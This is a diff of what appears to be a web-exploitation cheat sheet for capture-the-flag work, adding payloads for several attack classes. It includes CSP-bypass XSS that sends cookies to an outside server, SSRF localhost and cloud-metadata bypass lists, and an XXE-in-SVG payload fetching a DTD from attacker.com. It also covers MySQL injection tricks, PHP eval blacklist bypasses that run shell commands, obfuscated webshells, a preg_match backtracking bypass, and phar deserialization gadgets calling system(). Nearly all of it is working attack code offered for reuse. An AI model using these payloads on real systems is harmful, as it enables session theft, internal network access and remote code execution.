@@ -257,6 +257,26 @@ will just fetch content of evil.js from our server as self is not mentioned in C
 > Doesnt work on New Browsers 
 https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs
 
+
+* If we have self xss and policy is like:
+
+```
+default-src  'self'
+
+script-src  'self', 'google.com'   <==== google.com have lot of jsonp callbacks endpoint
+
+```
+
+we can do something like
+```
+<script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=window.open(location.hash.substr(1).concat(document.cookie))"></script><iframe src="#http://my.server.addr/"></iframe>
+
+OR
+
+<script src=https://accounts.google.com/o/oauth2/revoke?callback=fetch('https://server.com/?x='+document.cookie) />
+```
+
+
 ================================================================================================
 
 # GraphQL injection and enumeration
@@ -518,6 +538,11 @@ Our goal is to find if a server made a request to us or not. Ex `example.com/?u=
 
 ## Exploiting
 
+### Cloud meta
+[LINK TO Cloud meta addresses](./docx/cloud_metadata)
+
+
+### exploits
 For exploiting we maily target scheme/authority/path in URL
 ![alt](./images/attackURL.png)
 
@@ -578,6 +603,11 @@ http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit
 
 ## Smart Attack vector
 
+
+### ssrf from svg
+
+* `<rect fill=“url(//attacker.com/malicious.svg#exploit)”>` in svg files
+
 ### IP Bypasses
 
 #### 1
@@ -603,17 +633,36 @@ if (userInput && userInput.value.indexOf('.') == -1 && userInput.value.indexOf("
 
 #### 2
 
-using IPv6:
+Intruder list:
 ```
+https://localhost
+https://site.com <=== whtever site.com is
+https://[0:0:0:0:0:0:0:0]
+https://0.0.0.0
+https://[::]
+https://[::1]
+https://0177.1
+https://0x7f.0.0.1
+https://[::ffff:0:0]
+https://[0:0:0:0:0:ffff:0.0.0.0]
+https://[::ffff:0.0.0.0]
+https://017700000001
 https://[0:0:0:0:0:ffff:127.0.0.1]
 https://[::ffff:127.0.0.1]/
-https://[0:0:0:0:0:ffff:127.0.0.2]
+https://[::ffff:7f00:2]
+https://[::ffff:127.0.0.1]
 https://[::ffff:7f00:1]
+https://[0:0:0:0:0:ffff:127.0.0.2]
 http://[::ffff:169.254.169.254]
 http://[0:0:0:0:0:ffff:169.254.169.254]
-'http://[::ffff:a9fe:a9fe]
-
+https://[::ffff:127.0.0.2]
+http://[::ffff:a9fe:a9fe]
+https://0x7f.1
+http://0x7f000001
+http://2130706433
+http://127.000.001
 ```
+https://gitlab.com/gitlab-org/gitlab-ce/blob/418f945a247cce8e533595485f4946871b46540b/spec/lib/gitlab/url_blocker_spec.rb
 
 ### Time of check time of use
 
@@ -803,6 +852,16 @@ Limiting the number of requests made from client to server to avoid brute forcin
 
 
 # SQL Injection
+
+
+## Important files and location
+
+* config file : /etc/mysql/mysql.conf.d/mysqld.cnf
+	* some to look for entries:
+		* local-infile=TRUE
+		* table creation permission and write
+
+
 
 
 ## MSSQL Injection
@@ -1298,6 +1357,17 @@ So there are basically 3 types of it:
 * Error Based ()
 * OOB -out of band/Blind XXE (No ouput)
 
+If there is anything like:
+```
+DTD is prohibited in this XML document.
+or
+DOCTYPE is disallowed
+or
+DOCTYPE is not allowed
+```
+probably stop then, it might not be vulnerable.
+
+
 ## Exploiting
 
 **video in vids/xxe.mp4 for Inband and OOB exploitation.**
@@ -1369,6 +1439,15 @@ We will have to make request to our server to get output(XXE TO SSRF )
 
 ## Smart Attack vectors
 
+
+### WAF bypass
+
+SO if there's a WAF that blocks ur payload in 'xxe.xml', try converting it from utf-8 to utf-16 as :
+```
+ iconv -f utf-8 -t utf-16be < xxe.xml > xxe-utf-16.xml
+```
+
+
 ### CDATA To avoid bad characters 
 Suppose a file.txt contents are as :
 ```
@@ -1394,7 +1473,23 @@ So we can do something like
 %wrapper;
 ```
 
+### XXE inside svg
 
+```
+<!DOCTYPE svg [
+<!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd">
+%outside;
+]>
+<svg>
+  <defs>
+    <pattern id="exploit">
+      <text x="10" y="10">
+        &exfil;
+      </text>
+    </pattern>
+  </defs>
+</svg>
+```
 
 # Parameter polluting
 
@@ -1754,6 +1849,49 @@ site.com/?q=${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).get
 ```
 
 
+
+# mysql
+
+
+## utf-8 if allowed
+
+```
+select 'a' = 'à';   # will return 1
+
+```
+
+## bypass comment tricks
+
+```
+select * from inctf2018_chall_2 /*!having*/ username='àdmin'
+
+```
+
+## blinding injection using if
+
+```
+select if((1=1),sleep(3),null);
+```
+
+## blocking single ticks
+
+```
+select 'abcd';                              # will print abcd
+select 0b01100001011000100110001101100100;  # will print abcd
+select 0x61626364;                          # will print abcd
+
+```
+
+## alternatives for blocked stuff
+
+```
+where   : having
+<space> : %0a
+  =     : in
+```
+
+
+
 # PHP
 
 
@@ -1763,16 +1901,25 @@ site.com/?q=${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).get
 
 * allow-url-encode : true/false
 	* tells if php `include` can include remote file via `http` wrapper
-* session-save-path : /var/lib/php/session
+* session-save-path : /var/lib/php/session or /tmp sometimes
 	* location of saved cookie
 * disable_functions
 	* tell functions that dont work
-	* some function we should look for:
+	* some function we should look for as anyone of these gets us shell exec:
 		* system
+		* proc_open
+			```
+			$descriptorspec = array(
+			   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+			   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+			   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
+			);
+			$process = proc_open('/bin/ls /', $descriptorspec, $pipes); # command to execute
+			echo stream_get_contents($pipes[1]);
+			```
 		* exec
 		* shell_exec
 		* popen
-		* proc_open
 		* passthru
 		* symlink
 		* link
@@ -1780,25 +1927,13 @@ site.com/?q=${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).get
 		* imap_open
 		* ld
 		* mail
+		* mb_send_mail
 		* putenv
+		* pcntl_fork
+		* pcntl_exec
 
 
-## PHP bypass
-
-### `cannot have " or '`
-
-```
-> echo pack(C3,112,104,112);
-< "php"
-```
-
-`$_GET['q'] is preg_match and we cannot have "flag.php" in it`
-
-> Bypass 1
-
-```
-> site.com/?q=get_defined_vars()[_GET][X]&X=flag.php
-```
+## Eval Blacklisting bypass 
 
 ### cannot use character 
 
@@ -1810,9 +1945,7 @@ if(preg_match('/^[a-zA-Z0-9]$/'),$a){
   eval($a);
 }
 ```
-
-> bypass
-
+SOLUTION:
 ```
 site.com/?a=~%8C%86%8C%8B%9A%92(~%9C%9E%8B%DF%D5)
 ```
@@ -1820,14 +1953,118 @@ site.com/?a=~%8C%86%8C%8B%9A%92(~%9C%9E%8B%DF%D5)
 * `~` will negate %8C%86%8C%8B%9A%92 tht will produce string "system" , similarly %9C%9E%8B%DF%D5 is `cat *`
 * in PHP "system"("ls") is system("ls") and we get answer
 
-### Bypass 2 ** AWESOME PHP Fool **
 
-In php , if we send `site.com/?q=substr(asdf,0,10)`, so unlike most language showing asdf is not defined php will auto convert asdf to "asdf" string and pass into substr
+### blacklisting words manually
 
 ```
-> site.com/?q=str_rot13(substr(cjq))
+if(preg_match("flag.php", $input)){
+	echo "dead";
+}else{
+	eval($input);
+}
 ```
-so no need of `;'",$_` .
+
+```
+BYPASS :  site.com/?q=get_defined_vars()[_GET][X]&X=flag.php
+```
+
+### blacklisting words and function
+
+cannot have any function or 
+```
+function check($input){
+  foreach (get_defined_functions()['internal'] as $blacklisted) {
+      if (preg_match ('/' . $blacklisted . '/im', $input)) {
+          echo "Your input is blacklisted" . "<br>";
+          return true;
+          break;
+      }
+  }
+  $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\{|\}|\"|\'";
+  if(preg_match("/$blacklist/i", $input)){
+    echo "Do you really you need that?" . "<br>";
+    return true;
+  }
+
+  unset($blacklist);
+  return false;
+}
+
+if(check()){
+  echo "Naaah" . "<br>";
+}else{
+  eval($input);
+}
+```
+
+```
+SOLUTION: 
+site.com/?input=$p=p.ipe;
+$f=f.ile;
+$r=ch.r;
+$dd=$r(47).tmp.$r(47).xx;
+$qq=stream.$r(95).get.$r(95).contents;
+$md=$r(47).bin.$r(47).ls;
+$xx=proc.$r(95).open;
+$t = array(0 => array($p, r),1 => array($p, w),2 => array($f, $dd, w));
+$ps = $xx($md, $t, $xx);
+$xs=ne.xt;
+$rr=$xs($xx);
+echo $qq($rr);
+
+```
+
+1. Using proc_open  to execute shell command 
+2. using string concant "." to bypass blacklist as chr is blocked but "ch"."r" is not and "chr"(47) is same as chr(47)
+3. in php $x=vari.able is equivalent to $x="vari"."able" and on eval gives "variable".
+4. bcz _ is blocked and mostly functions use _ , like file_put_contents, we can file.chr(47).put.chr(47)(ls) = "file_put"("ls")
+
+### PHP eval bypasses without valid characters
+
+Shell-1: you can execute it like "shell.php?0=system&1=ls"
+
+```
+<?
+@$_[]=@! _; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((  $__) ($__   ))].=$_;
+$_[]=  $__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__ $__)  $_[$__-$__]).($__ $__ $__) $_[$__-$__];
+$_[$__ $__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] );
+$_[$__ $__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] );
+$_[$__ $__] .=($_[$__][$__ $__])^$_[$__][($__<<$__)-$__ ];
+$_=$ 
+$_[$__  $__] ;$_[@-_]($_[@! _] );
+?>
+```
+
+`shell-2: You can execute it like "shell.php?_=system&__=ls"`
+
+```
+<?php
+$_="{"; 
+$_=($_^"<").($_^">;").($_^"/");
+?>
+<?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
+```
+
+if user input is highly sanitized and passed into eval , we can use techniqe below to create dangerous payloads
+
+```
+/*
+* $payload = "(%ff%ff)^(%d1);";  ===> results in "." 
+* $payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f);"; => scandir
+* $payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8f%9e%96%96%8c%a0%9e)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f);"; => print_r
+* $payload = "((%ff%ff%ff%ff%ff%ff%ff%ff)^(%8d%9a%9e%9b%9b%96%91%9a)^(%ff%ff%ff%ff%9e%ff%9e%ff)^(%ff%ff%ff%ff%9c%ff%9c%ff));"; => readfile
+* $payload = "IBBCBBBB%5ENIMIIICI%5Eunnnmbmn;";  => small version of scandir
+* $payload = "C%5Ei;"; => *
+* $payload = "BBBB%5EICCC%5Elmnc;"; => glob
+*/
+
+$payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8f%9e%96%96%8c%a0%9e)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f);";
+
+
+$decoded_payload = urldecode($payload);
+echo $decoded_payload;
+
+```
 
 ## PHP cannot have `_`
 
@@ -1836,22 +2073,6 @@ so no need of `;'",$_` .
 ##spaces are not allowed
 
 **Use `+` in query string to bypass space .**
-
-## PHP file_get_content 
-
-**This is super dangerous**
-
-```
-$f = $_GET['content'];
-file_get_contents($f);
-```
-
-Possible values of `$f` are:
-* file_get_contents('https://www.evil.com/mydata'); so `$f = https://www.evil.com/mydata`
-* `php://input` and "mydata" in POST `so $f=php://input`
-* All php wrapper , `php://filter`, `php://fd/0` etc
-* `$f = data://text/plain,Hello Challenge! `
-* `$f = data://text/plain;base64,SGVsbG8gQ2hhbGxlbmdlIQ`
 
 
 ## PHP Assert
@@ -1882,31 +2103,6 @@ Connection: close
 and include
 `?lfi_file=/var/log/apache2/access.log&cmd=<command>`
 
-## shell without valid character
-
-Shell-1: you can execute it like "shell.php?0=system&1=ls"
-
-```
-<?
-@$_[]=@! _; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((  $__) ($__   ))].=$_;
-$_[]=  $__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__ $__)  $_[$__-$__]).($__ $__ $__) $_[$__-$__];
-$_[$__ $__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] );
-$_[$__ $__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] );
-$_[$__ $__] .=($_[$__][$__ $__])^$_[$__][($__<<$__)-$__ ];
-$_=$ 
-$_[$__  $__] ;$_[@-_]($_[@! _] );
-?>
-```
-
-`shell-2: You can execute it like "shell.php?_=system&__=ls"`
-
-```
-<?php
-$_="{"; 
-$_=($_^"<").($_^">;").($_^"/");
-?>
-<?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
-```
 
 ## PHP dangerous function
 
@@ -1915,36 +2111,50 @@ $_=($_^"<").($_^">;").($_^"/");
 * file_get_contents
 * md5_file
 * file_exists
-	* wrapper like http, ftp, file etc works(in old version), in new version also its default off,samba works on windows .(in all file_get_contents,md5 file and file_exists)
+	* wrapper like 
+		php://input, php://fd/0
+		data://text/plain;base64,SGVsbG8gQ2hhbGxlbmdlIQ
+		http://
+		ftp://
+		file:// etc works(in old version), 
+		in new version also its default off,samba works on windows .(in all file_get_contents,md5 file and file_exists)
+
 * deserialize
 	* Can deserialize phar or any serialzed php to execute code
 * assert
 	* It basically an eval
 * htmlspecialchars
 	* doesnt encode single quote ' until specified
+* parse_str
+	* Parses the string into variables. `parse_str("action=auth&key=aaa"); echo $action;`
+* sha1() and md5()
+	* sha1([]) = md5([]) = NULL
+* is_numeric()
+    * is_numeric(" \t\r\n 123")  == is_numeric("  44")  == true
+* in_array()
+	* in_array('5 or 1=1', array(1, 2, 3, 4, 5)) == in_array('test', array(0, 1, 2)) == in_array(array(), array('kai'=>false))
 
-## PHP eval bypasses
-
-if user input is highly sanitized and passed into eval , we can use techniqe below to create dangerous payloads
-
-```
-/*
-* $payload = "(%ff%ff)^(%d1);";  ===> results in "." 
-* $payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f);"; => scandir
-* $payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8f%9e%96%96%8c%a0%9e)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f);"; => print_r
-* $payload = "((%ff%ff%ff%ff%ff%ff%ff%ff)^(%8d%9a%9e%9b%9b%96%91%9a)^(%ff%ff%ff%ff%9e%ff%9e%ff)^(%ff%ff%ff%ff%9c%ff%9c%ff));"; => readfile
-* $payload = "IBBCBBBB%5ENIMIIICI%5Eunnnmbmn;";  => small version of scandir
-* $payload = "C%5Ei;"; => *
-* $payload = "BBBB%5EICCC%5Elmnc;"; => glob
-*/
-
-$payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8f%9e%96%96%8c%a0%9e)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f);";
-
-
-$decoded_payload = urldecode($payload);
-echo $decoded_payload;
+## preg_match
 
 ```
+if(preg_match('/sleep|BENCHMARK|processlist|GET_LOCK|information_schema|into.+?outfile|into.+?dumpfile|\/\*.*\*\//is', $query)) {
+    echo('Go out!!!');
+}
+```
+
+So preg_match can be bypasses when 2 condition meet
+1. === is not used , is there is `preg_match() === false`, it wont work
+2. regex has something like `into.+?dumpfile`, .+ between 2 words
+
+So if above 2 match, accroding to [preg_match_bypass](./docx/preg_match_bypass.pdf) , we can do something like:
+
+```
+"select xx into/*" . str_repeat("a",1000000) ."*/dumpfile";
+```
+due to greedy approch used, backtrack algo wont be able to backtract 1000000 "a". it starts backtracking from dumpfile to search for into and will give up after few 10000 "a" and return false .this limit of 1000000 is defined in php_info.
+
+
+
 
 ## PHP Object deserialize
 
@@ -2005,16 +2215,60 @@ $phar->stopBuffering();
   * include("ourfile")
   * require("ourfile")
   * fopen("ourfile")
+  * exif_thumbnail
+  * exif_imagetype
+  * imageloadfont
+  * imagecreatefrom***
+  * get_meta_tags
+  * getimagesize
+  * getimagesizefromstring
+  * get_headers
+  * hash_file
+  * hash_update_file
+  * http://localhost/phar-question/index.php?f=compress.bzip2://phar://exploit.phar
+  * sha1_file
+  * hash_hmac_file
   * file_get_contents("ourfile")    <---- can be easily there
   * file("ourfile")         
   * file_exists("ourfile")          <---- can be easily there, i mean whn u upload file they do check
   * md5_file("ourfile")             <---- this can also exist
   * filemtime("ourfile")
   * filesize("ourfile")             <---- this is also comman
+* Postgres
+```
+<?php
+$pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres", "sx", "123456"));
+@$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');
+```
+* mysqld
+
+> if: local-infile=1 and secure_file_priv=""
+
+
+```
+<?php
+class A {
+    public $s = '';
+    public function __wakeup () {
+        system($this->s);
+    }
+}
+$m = mysqli_init();
+mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
+$s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);
+$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
+```
+* zip
+```
+$zip = new ZipArchive();
+$res = $zip->open('c.zip');
+$zip->extractTo('phar://test.phar/test');
+```
+
 
 so,
 ```
-xxx.com/?file=phar://ourfile
+xxx.com/?file=phar://uploads/exploit.phar
 ```
 Backend : 
 ```
@@ -2024,20 +2278,14 @@ Backend :
   }
 ```
 
-
-
-I mean yes noone will include, or require file we upload, but file_exists or file_get_contents is comman which will deserialize our payload 
-
-
-
-
-
 # Node/JS
 
 ## Array and text
 
 ```
-["123"] == "123"
+["123"] == 123 
+true <== auto type cast from array to string, string to int
+[1,1] == "1,1"
 true
 ```
 ## http module NN/ is ../
@@ -2062,6 +2310,13 @@ Reason is `NN` is basically `\xFF\x2E\xFF\x2E` and `\xFF` is stripped by http ma
 
 ## sandbox escaping 
 
+### how to find escape
+
+using `with` for context switching
+
+TODO
+
+### node's inbuilt vm API escape
 we are given an endpoint to run js code in sandboxed environment, `site.com/run?js=console.log(234)` <br/>
 
 * First step is to find what environment we are in, which can be done by throwing error
